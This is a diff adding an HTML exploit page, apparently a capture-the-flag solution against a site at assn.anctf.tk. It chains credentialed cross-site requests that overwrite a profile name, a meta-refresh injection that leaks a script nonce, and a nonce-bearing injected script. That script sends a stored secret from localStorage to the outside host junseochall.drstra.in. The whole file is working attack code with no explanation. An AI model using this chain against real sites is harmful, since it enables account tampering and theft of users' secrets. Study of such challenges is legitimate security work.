@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<body>
+  <script>
+    async function changeName(name) {
+      const csrf = localStorage.getItem('csrf');
+      try {
+        await fetch('https://assn.anctf.tk/profile/', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/x-www-form-urlencoded'
+          },
+          credentials: 'include',
+          body: `name=${encodeURIComponent(name)}&csrf=${csrf}`,
+        });
+      } catch (err) {}
+    }
+    const urlParams = new URLSearchParams(window.location.search);
+    const leak = urlParams.get('leak');
+
+    if (!leak) {
+      async function leakNonce(csrf) {
+        localStorage.setItem('csrf', csrf);
+        await changeName(`<meta http-equiv="refresh" content='0; url=http://junseochall.drstra.in/?leak=`);
+        location = 'https://assn.anctf.tk/profile/';
+      }
+      window.addEventListener('message', (t) => leakNonce(t.data));
+      let t = document.createElement('iframe');
+      t.src = '/file2.html';
+      document.body.appendChild(t);
+    } else {
+      const nonce = leak.split('nonce=')[1].split(' ')[0];
+      async function xss(nonce) {
+        let t = 'scr' + 'ipt';
+        await changeName(`<${t} nonce=${nonce}>location = 'http://junseochall.drstra.in/flag_' + localStorage.getItem('secret');</${t}>`)
+        location = 'https://assn.anctf.tk/profile/';
+      }
+      xss(nonce);
+    }
+  </script>
+</body>
+</html>
